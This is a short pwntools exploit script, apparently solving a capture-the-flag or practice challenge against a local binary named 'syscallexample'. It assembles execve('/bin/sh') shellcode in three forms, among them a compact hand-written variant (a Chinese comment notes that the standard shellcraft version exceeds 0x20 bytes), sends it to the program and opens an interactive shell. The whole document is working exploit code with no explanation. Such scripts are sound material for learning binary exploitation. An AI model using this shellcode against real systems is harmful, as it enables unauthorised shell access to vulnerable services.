from pwn import *

r = process('./syscallexample')
context.log_level = 'debug'
context.arch = 'amd64'

# 太大了，超过0x20
shellcode = asm(shellcraft.sh())

shellcode2 = asm('''
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi, esi
    xor edx, edx
    push 0x3b
    pop rax
    syscall
''')

payload3 = asm(
         "mov rax, 59\n"
        "mov rbx,0x68732f6e69622f\n"
        "push rbx\n"
        "mov rdi,rsp\n"
        "xor rsi, rsi\n"
        "xor rdx, rdx\n" 
        "syscall\n"
)

r.sendlineafter(b'call!', shellcode2)
r.interactive()

